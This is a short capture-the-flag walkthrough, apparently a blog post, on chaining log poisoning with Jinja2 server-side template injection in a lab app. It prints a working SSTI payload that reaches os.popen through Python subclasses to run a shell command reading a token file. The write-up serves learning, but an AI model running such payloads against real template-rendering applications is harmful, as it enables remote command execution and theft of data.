---
date: 2025-03-15
categories: [CTF, IML]
title: "IML - Log Poisoning"
tags: ['log poisoning']

description: "Log Poisoning - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Log Poisoning

This is log poisoning and Jinja SSTI

**Reset if you get Internal Server Error**

Register new user

Go to search term and search for "user=admin"
While on that search result page - change the URL to <http://10.102.122.21/raw/log.txt>

You should be able to view the raw log file now

Go back to search and use the payload:
{% raw %}
```text
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /tmp/token.txt").read()}}{% endif %}{% endfor %}
```
{% endraw %}
Now search for user=admin again and go to <http://10.102.122.21/raw/log.txt>

- And we get the token:

![image1](../resources/fb9f93ba8d6645828fcb4124db85d764.png)

<https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6>